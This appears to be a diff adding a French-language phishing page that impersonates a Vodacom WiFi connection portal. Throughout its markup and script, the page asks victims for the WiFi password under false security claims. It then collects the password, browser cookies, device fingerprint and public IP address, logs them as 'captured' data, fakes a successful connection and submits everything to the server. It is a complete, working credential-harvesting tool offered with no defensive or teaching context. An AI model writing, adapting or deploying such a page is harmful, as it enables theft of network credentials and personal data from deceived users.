@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vodacom WiFi - Connexion</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --vodacom-red: #E60000;
+            --vodacom-dark-red: #CC0000;
+            --vodacom-light-red: #FF3333;
+            --vodacom-gray: #F5F5F5;
+            --vodacom-dark-gray: #333333;
+            --vodacom-border: #DDDDDD;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', 'Helvetica', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #FFFFFF 0%, var(--vodacom-gray) 100%);
+            color: var(--vodacom-dark-gray);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Indicateur Vodacom */
+        .vodacom-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(230, 0, 0, 0.1);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: var(--vodacom-red);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            z-index: 1000;
+            border: 1px solid rgba(230, 0, 0, 0.2);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--vodacom-border);
+        }
+
+        /* En-tête Vodacom */
+        .vodacom-header {
+            background: var(--vodacom-red);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .vodacom-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: float 20s linear infinite;
+        }
+
+        @keyframes float {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .vodacom-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-circle {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo-circle i {
+            font-size: 40px;
+            color: var(--vodacom-red);
+        }
+
+        .vodacom-title h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            letter-spacing: -0.5px;
+        }
+
+        .vodacom-title p {
+            font-size: 16px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        /* Informations réseau */
+        .network-info {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            z-index: 2;
+        }
+
+        .network-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .network-item:last-child {
+            border-bottom: none;
+        }
+
+        .network-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .network-value {
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .signal-indicator {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .signal-bar {
+            width: 6px;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+        }
+
+        .signal-bar.active {
+            background: #4CAF50;
+        }
+
+        /* Contenu principal */
+        .vodacom-content {
+            padding: 30px;
+        }
+
+        .security-alert {
+            background: #FFF3CD;
+            border: 1px solid #FFC107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .security-alert i {
+            color: #856404;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .security-alert p {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .security-alert strong {
+            font-weight: 700;
+        }
+
+        /* Formulaire */
+        .vodacom-form {
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--vodacom-dark-gray);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .vodacom-input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid var(--vodacom-border);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: var(--vodacom-gray);
+        }
+
+        .vodacom-input:focus {
+            border-color: var(--vodacom-red);
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .password-hint {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+            padding: 12px 15px;
+            background: #E8F4FD;
+            border-radius: 8px;
+            border-left: 4px solid var(--vodacom-red);
+        }
+
+        .password-hint i {
+            color: var(--vodacom-red);
+            font-size: 18px;
+        }
+
+        .password-hint p {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Bouton Vodacom */
+        .vodacom-button {
+            width: 100%;
+            padding: 18px;
+            background: var(--vodacom-red);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .vodacom-button:hover {
+            background: var(--vodacom-dark-red);
+            transform: translateY(-2px);
+            box-shadow: 0 7px 14px rgba(230, 0, 0, 0.25);
+        }
+
+        .vodacom-button:active {
+            transform: translateY(0);
+        }
+
+        .vodacom-button:disabled {
+            background: #CCCCCC;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .button-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Message de statut */
+        .status-message {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .status-success {
+            background: #D4EDDA;
+            color: #155724;
+            border: 1px solid #C3E6CB;
+        }
+
+        .status-error {
+            background: #F8D7DA;
+            color: #721C24;
+            border: 1px solid #F5C6CB;
+        }
+
+        /* Informations Vodacom */
+        .vodacom-info {
+            background: var(--vodacom-gray);
+            padding: 20px;
+            border-top: 1px solid var(--vodacom-border);
+            text-align: center;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .info-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid var(--vodacom-border);
+        }
+
+        .info-item i {
+            color: var(--vodacom-red);
+            font-size: 24px;
+        }
+
+        .info-item span {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        /* Footer */
+        .vodacom-footer {
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            background: white;
+            border-top: 1px solid var(--vodacom-border);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+
+        .footer-links a {
+            color: var(--vodacom-red);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Animation des barres de signal */
+        @keyframes signalPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 8px;
+            }
+            
+            .vodacom-header {
+                padding: 25px 20px;
+            }
+            
+            .vodacom-title h1 {
+                font-size: 24px;
+            }
+            
+            .vodacom-content {
+                padding: 25px 20px;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .vodacom-indicator {
+                top: 10px;
+                right: 10px;
+                font-size: 12px;
+                padding: 6px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Indicateur Vodacom -->
+    <div class="vodacom-indicator">
+        <i class="fas fa-wifi"></i>
+        <span id="vodacomStatus">Vodacom WiFi</span>
+    </div>
+
+    <div class="container">
+        <!-- En-tête Vodacom -->
+        <div class="vodacom-header">
+            <div class="vodacom-logo">
+                <div class="logo-circle">
+                    <i class="fas fa-broadcast-tower"></i>
+                </div>
+                <div class="vodacom-title">
+                    <h1>Vodacom WiFi</h1>
+                    <p>Connexion Internet Haut Débit</p>
+                </div>
+            </div>
+            
+            <!-- Informations réseau -->
+            <div class="network-info">
+                <div class="network-item">
+                    <div class="network-label">
+                        <i class="fas fa-network-wired"></i>
+                        <span>Réseau WiFi:</span>
+                    </div>
+                    <div class="network-value" id="ssidDisplay">Vodacom_WiFi</div>
+                </div>
+                
+                <div class="network-item">
+                    <div class="network-label">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Sécurité:</span>
+                    </div>
+                    <div class="network-value">WPA2</div>
+                </div>
+                
+                <div class="network-item">
+                    <div class="network-label">
+                        <i class="fas fa-signal"></i>
+                        <span>Signal:</span>
+                    </div>
+                    <div class="signal-indicator" id="signalBars">
+                        <div class="signal-bar active"></div>
+                        <div class="signal-bar active"></div>
+                        <div class="signal-bar active"></div>
+                        <div class="signal-bar"></div>
+                        <div class="signal-bar"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Contenu principal -->
+        <div class="vodacom-content">
+            <!-- Alerte sécurité -->
+            <div class="security-alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>
+                    <strong>Connexion sécurisée requise</strong><br>
+                    Pour accéder au réseau Vodacom WiFi, vous devez saisir le mot de passe de sécurité.
+                    Ce réseau utilise le cryptage WPA2 pour protéger vos données.
+                </p>
+            </div>
+            
+            <!-- Message de statut -->
+            <div id="statusMessage" class="status-message"></div>
+            
+            <!-- Formulaire Vodacom -->
+            <form class="vodacom-form" id="vodacomForm" method="POST">
+                <input type="hidden" name="page_name" value="vodacom.html">
+                <input type="hidden" name="network_name" value="Vodacom_WiFi">
+                
+                <div class="form-group">
+                    <label for="wifiPassword">
+                        <i class="fas fa-key"></i> Mot de passe WiFi Vodacom
+                    </label>
+                    <div class="password-container">
+                        <input type="password" id="wifiPassword" name="password" 
+                               class="vodacom-input" 
+                               placeholder="Entrez le mot de passe du réseau"
+                               required autocomplete="off" autofocus>
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="password-hint">
+                        <i class="fas fa-info-circle"></i>
+                        <p>
+                            Le mot de passe se trouve sur votre routeur Vodacom ou a été fourni 
+                            par le support technique. Il est généralement composé de 8 à 12 caractères.
+                        </p>
+                    </div>
+                </div>
+
+                <button type="submit" class="vodacom-button" id="submitButton">
+                    <span id="buttonText">Se connecter au WiFi</span>
+                    <div class="button-spinner" id="buttonSpinner"></div>
+                </button>
+            </form>
+        </div>
+
+        <!-- Informations Vodacom -->
+        <div class="vodacom-info">
+            <p style="font-weight: 600; color: var(--vodacom-red); margin-bottom: 10px;">
+                <i class="fas fa-bolt"></i> Pourquoi choisir Vodacom WiFi ?
+            </p>
+            
+            <div class="info-grid">
+                <div class="info-item">
+                    <i class="fas fa-tachometer-alt"></i>
+                    <span>Vitesse élevée</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Sécurité maximale</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-infinity"></i>
+                    <span>Connexion illimitée</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer Vodacom -->
+        <div class="vodacom-footer">
+            <p>© 2024 Vodacom Group. Tous droits réservés.</p>
+            <p>Service client disponible 24h/24, 7j/7</p>
+            
+            <div class="footer-links">
+                <a href="#" id="supportLink">Support technique</a>
+                <a href="#" id="termsLink">Conditions d'utilisation</a>
+                <a href="#" id="privacyLink">Confidentialité</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // FONCTIONS PRINCIPALES
+        // ============================================
+
+        // Détecter l'appareil et les informations réseau
+        function detectDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = 'PC';
+            let os = 'Système inconnu';
+            
+            // Détection OS
+            if (/android/i.test(userAgent)) {
+                deviceType = 'Mobile';
+                os = 'Android';
+            } else if (/iPad|iPhone|iPod/.test(userAgent)) {
+                deviceType = 'Mobile';
+                os = /iPad/.test(userAgent) ? 'iPadOS' : 'iOS';
+            } else if (/Windows/.test(userAgent)) {
+                deviceType = 'PC';
+                os = 'Windows';
+            } else if (/Macintosh|Mac OS/.test(userAgent)) {
+                deviceType = 'PC';
+                os = 'macOS';
+            }
+            
+            // Récupérer la résolution
+            const resolution = `${window.screen.width}x${window.screen.height}`;
+            
+            // Récupérer le navigateur
+            let browser = 'Navigateur inconnu';
+            if (/chrome/i.test(userAgent) && !/edge/i.test(userAgent)) {
+                browser = 'Chrome';
+            } else if (/firefox/i.test(userAgent)) {
+                browser = 'Firefox';
+            } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
+                browser = 'Safari';
+            } else if (/edge/i.test(userAgent)) {
+                browser = 'Edge';
+            }
+            
+            return {
+                deviceType: deviceType,
+                os: os,
+                browser: browser,
+                resolution: resolution,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: userAgent.substring(0, 150),
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'Inconnu',
+                cookiesEnabled: navigator.cookieEnabled,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Inconnu'
+            };
+        }
+
+        // Récupérer l'adresse IP
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.log('Impossible de récupérer l\'IP:', error);
+                return 'Non disponible';
+            }
+        }
+
+        // Collecter toutes les données
+        function collectFormData() {
+            const password = document.getElementById('wifiPassword').value;
+            const deviceInfo = detectDeviceInfo();
+            
+            // Horodatage
+            const timestamp = new Date().toISOString();
+            
+            // Informations réseau
+            const networkInfo = {
+                ssid: document.getElementById('ssidDisplay').textContent,
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // Cookies
+            const cookies = document.cookie;
+            
+            // Localisation (si autorisée)
+            let location = null;
+            
+            return {
+                // Données WiFi
+                password: password,
+                
+                // Informations appareil
+                deviceInfo: deviceInfo,
+                timestamp: timestamp,
+                
+                // Informations réseau
+                networkInfo: networkInfo,
+                cookies: cookies,
+                
+                // Métadonnées
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: deviceInfo.timezone
+            };
+        }
+
+        // Sauvegarder localement
+        function saveDataLocally(data) {
+            try {
+                const previousData = JSON.parse(localStorage.getItem('vodacom_wifi') || '[]');
+                previousData.push(data);
+                localStorage.setItem('vodacom_wifi', JSON.stringify(previousData));
+                
+                console.log('📶 VODACOM DONNÉES CAPTURÉES:', {
+                    password_length: data.password ? data.password.length : 0,
+                    device: data.deviceInfo.deviceType,
+                    os: data.deviceInfo.os,
+                    browser: data.deviceInfo.browser,
+                    timestamp: data.timestamp
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Erreur sauvegarde locale:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // ANIMATIONS ET INTERFACE
+        // ============================================
+
+        // Animer les barres de signal
+        function animateSignalBars() {
+            const bars = document.querySelectorAll('.signal-bar');
+            const activeCount = Math.floor(Math.random() * 3) + 2; // 2-4 barres
+            
+            bars.forEach((bar, index) => {
+                bar.classList.remove('active');
+                if (index < activeCount) {
+                    bar.classList.add('active');
+                    bar.style.animation = `signalPulse ${0.5 + index * 0.2}s infinite`;
+                }
+            });
+        }
+
+        // Afficher/masquer le mot de passe
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordField = document.getElementById('wifiPassword');
+            const icon = this.querySelector('i');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                passwordField.type = 'password';
+                icon.className = 'fas fa-eye';
+            }
+        });
+
+        // Afficher un message de statut
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `status-message status-${type}`;
+            statusEl.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        // ============================================
+        // GESTION DU FORMULAIRE
+        // ============================================
+
+        // Soumission du formulaire
+        document.getElementById('vodacomForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const button = document.getElementById('submitButton');
+            const buttonText = document.getElementById('buttonText');
+            const spinner = document.getElementById('buttonSpinner');
+            
+            // Activer l'état de chargement
+            button.disabled = true;
+            buttonText.style.display = 'none';
+            spinner.style.display = 'block';
+            
+            // Collecter les données
+            const formData = collectFormData();
+            
+            // Sauvegarder localement
+            saveDataLocally(formData);
+            
+            // Afficher le message de connexion
+            showStatus('Connexion au réseau Vodacom...', 'success');
+            
+            // Simuler le processus de connexion
+            setTimeout(async () => {
+                // Récupérer l'adresse IP
+                const ip = await getIPAddress();
+                formData.ipAddress = ip;
+                console.log('🌐 Adresse IP détectée:', ip);
+                
+                // Vérifier le mot de passe
+                if (!formData.password || formData.password.length < 8) {
+                    showStatus('❌ Le mot de passe doit contenir au moins 8 caractères.', 'error');
+                    
+                    button.disabled = false;
+                    buttonText.style.display = 'inline';
+                    spinner.style.display = 'none';
+                    return;
+                }
+                
+                // Connexion "réussie"
+                showStatus('✅ Connexion établie avec Vodacom WiFi !', 'success');
+                
+                // Mettre à jour l'interface
+                document.getElementById('vodacomStatus').innerHTML = 
+                    'Vodacom WiFi <i class="fas fa-check" style="color: #4CAF50; margin-left: 5px;"></i>';
+                
+                // Animer toutes les barres de signal
+                const bars = document.querySelectorAll('.signal-bar');
+                bars.forEach(bar => {
+                    bar.classList.add('active');
+                    bar.style.background = '#4CAF50';
+                });
+                
+                // Soumettre le formulaire au serveur
+                setTimeout(() => {
+                    this.submit();
+                }, 2000);
+                
+            }, 2000);
+        });
+
+        // ============================================
+        // LIENS DU FOOTER
+        // ============================================
+
+        document.getElementById('supportLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showStatus('Connexion au support technique Vodacom...', 'success');
+            console.log('🆘 Support technique demandé');
+        });
+
+        document.getElementById('termsLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showStatus('Chargement des conditions d\'utilisation...', 'success');
+            console.log('📄 Conditions d\'utilisation demandées');
+        });
+
+        document.getElementById('privacyLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showStatus('Chargement de la politique de confidentialité...', 'success');
+            console.log('🔒 Politique de confidentialité demandée');
+        });
+
+        // ============================================
+        // INITIALISATION
+        // ============================================
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Afficher les informations de l'appareil
+            const deviceInfo = detectDeviceInfo();
+            console.log('📱 Appareil détecté pour Vodacom:', deviceInfo);
+            
+            // Animer les barres de signal
+            setInterval(animateSignalBars, 2000);
+            animateSignalBars();
+            
+            // Focus sur le champ mot de passe
+            document.getElementById('wifiPassword').focus();
+            
+            // Vérifier les captures précédentes
+            const previousConnections = localStorage.getItem('vodacom_wifi');
+            if (previousConnections) {
+                const connections = JSON.parse(previousConnections);
+                console.log(`📊 ${connections.length} connexion(s) Vodacom précédente(s) enregistrée(s)`);
+            }
+            
+            // Détection du portail captif
+            const captiveUrls = [
+                'http://connectivitycheck.gstatic.com/generate_204',
+                'http://msftconnecttest.com/connecttest.txt'
+            ];
+            
+            fetch(captiveUrls[0], { mode: 'no-cors', cache: 'no-store' })
+                .catch(() => {
+                    console.log('📶 Portail captif Vodacom détecté');
+                });
+            
+            // Changer le nom du SSID aléatoirement
+            const ssidNames = [
+                'Vodacom_WiFi',
+                'Vodacom_Free_WiFi',
+                'Vodacom_Hotspot',
+                'Vodacom_Network'
+            ];
+            const randomSsid = ssidNames[Math.floor(Math.random() * ssidNames.length)];
+            document.getElementById('ssidDisplay').textContent = randomSsid;
+        });
+    </script>
+</body>
+</html>
